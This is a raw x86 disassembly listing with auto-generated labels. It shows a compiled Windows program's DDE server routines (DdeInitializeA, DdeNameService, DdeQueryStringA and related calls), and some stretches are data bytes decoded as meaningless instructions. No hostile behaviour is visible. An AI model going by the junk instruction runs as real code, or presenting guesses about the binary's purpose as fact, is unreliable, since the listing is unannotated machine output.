cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] ah
xchg esp eax
inc esi
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
inc ebp
inc esp
inc ebp
jb r-xdata
mov al [ 0x6800468e ]
jb r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al ch
xchg ebx eax
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] ch
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
outsd
jb r-xdata
add [ edi + 0x6b680046 ] al
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ edx + ebp * 2 + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
jb r-xdata
add [ eax ] al
add [ edx ] ch
jo r-xdata
je r-xdata
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc esi
add [ edi ] al
shl [ edi + ebp * 2 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x46 ] dl
add [ eax + 0x6f ] bh
inc esi
call sub_409730
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
jo r-xdata
outsd
outsb
jbe r-xdata
jmp 0xffffffffe65a704b
imul eax [ ecx ] 0x1c
add [ eax ] cl
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6800468e ] ah
insd
nop
js r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467215
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
fdiv [ eax + 0x46 ]
add [ edi ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x70ac6d65
inc esi
add ah dh
cmp al [ ecx ]
add [ eax ] eax
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
lodsb [ esi ]
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
add [ ebx ] cl
push esp
inc esp
inc ebx
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
add [ eax + eax ] dl
add [ eax ] al
cmp [ edx ] 0x41
inc ecx
add [ ecx + edi ] dl
adc al 0xe9
cmp al 0x70
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
mov es [ esi ]
push 0x1c00416b
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
jb r-xdata
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + ecx * 4 + 0x46 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] ch
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
inc ecx
outsd
outsb
jbe r-xdata
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
adc al 0x39
je r-xdata
inc ebx
outsd
inc esi
add [ eax + 0x49 ] ah
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
jo r-xdata
inc ecx
add [ 0x6a840041 ] bl
inc ecx
insd
and al 0x6f
inc esi
add [ eax + 0x49 ] ah
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
call sub_46b610
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jo r-xdata
xchg [ esi ] eax
push 0x7000416b
imul eax [ ecx ] 0xffffff84
push 0x41
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffb990 ] bh
jo r-xdata
add ah dh
in eax 0x41
push 0x41
add [ eax + esi * 2 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_466e84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_46711c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_46720e
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467215
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409730
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409730
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409730
sub_46721c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_4675c4
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_467678
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4676dc
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_469088
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46913c
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_469058
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_468f24
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46915c
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_4682c4
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46915c
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_468310
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4677c0
mov eax ebx
call sub_4682cc
jmp r-xdata
sub_46742c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4674e0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41e1a4
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_46721c
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_46711c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a28
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_467808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674e7
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
add esp 0xfffffff0
call sub_403a24
sub_467509
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_403a8c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_4036c0
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_4678bc
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41e1f0
test bl bl
jle r-xdata
call sub_4036c0
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_4036c0
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4161a0
call sub_4036c0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403a74
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_4161a0
call sub_4036c0
inc edi
dec esi
jne r-xdata
sub_4675c4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_467668
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_40451c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4678e8
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_467938
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46766f
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov bl 0x1
sub_467678
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_4675c4
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_4676dc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4677ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_468e5c
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_40451c
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_404480
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4678e8
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_416044
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_467938
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4677b4
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov si 0xffef
call sub_4038bc
sub_4677c0
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_4038bc
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_416340
mov eax ebx
call sub_4036c0
sub_467808
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4678a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4678bc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408e9c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_404480
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_404a20
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4678ab
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebx + 0x30 ]
call sub_4046e4
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40497c
sub_4678bc
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_4678e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_4161a0
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_408800
test eax eax
jne r-xdata
sub_467938
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_4679ba
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fabc
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4679c1
lea eax [ ebp - 0xc ]
call sub_40442c
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45faa8
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_408800
test eax eax
jne r-xdata
sub_4679cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4161a0
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_408800
test eax eax
jne r-xdata
sub_467a1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_467a73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4679cc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467a7a
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov edx [ ebp - 0x4 ]
call sub_469344
test eax eax
je r-xdata
call sub_469528
sub_467aa0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_467ae8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_46812c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
mov eax [ esi + 0x9c ]
call sub_4036c0
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_467b28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e51c
push ebx
push sub_467bf8
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_467b75
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_467bec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41e5f4
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4044c4
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_4044c4
mov eax [ ebp - 0x4 ]
call sub_4046e4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467bf3
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_467ee8
sub_467bf8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_467ca3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41a8a8
jmp r-xdata
mov eax esi
call sub_419af8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41b508
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404a20
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_40493c
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41a8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467caa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4683d0
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4683e4
jmp r-xdata
sub_467cb7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_467d73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ca0c
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_4044c4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_409730
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41df5c
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_4044c4
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_409730
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_41df5c
mov eax ebx
call sub_41ca14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467d7a
lea eax [ ebp - 0x14 ]
call sub_40442c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_467da8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4686bc
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_41621c
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_46872c
pop edi
pop esi
pop ebx
retn
sub_467de0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_467ea0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46872c
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_416340
mov eax ebx
call sub_4036c0
sub_467e18
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_467ea0
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4046e4
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4046e4
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_467da8
mov edx edi
mov eax esi
call sub_467ea0
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_46872c
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_467de0
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_467de0
sub_467ea0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4161a0
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_467ee8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_46812c
mov edx ebx
mov eax esi
call sub_4683d0
mov edx edi
mov eax esi
call sub_4683e4
mov eax esi
call sub_467f38
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_4683d0
xor edx edx
mov eax esi
call sub_4683e4
sub_467f38
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46810e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468115
lea eax [ ebp - 0x108 ]
call sub_40442c
retn
mov eax [ edi + 0x30 ]
call sub_4046e4
test eax eax
jne r-xdata
